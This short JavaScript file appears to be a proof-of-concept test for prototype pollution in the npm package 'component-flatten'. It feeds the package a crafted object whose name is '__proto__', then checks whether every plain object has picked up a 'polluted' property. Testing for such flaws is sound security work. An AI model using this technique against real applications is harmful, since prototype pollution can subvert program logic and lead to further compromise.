var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const cf = require('component-flatten');
let tree = {
    ref: 'polluted',
    name: '__proto__'
};
cf(tree);
if ({}.polluted != undefined) {
    console.log('yes');
} else {
    console.log(undefined);
}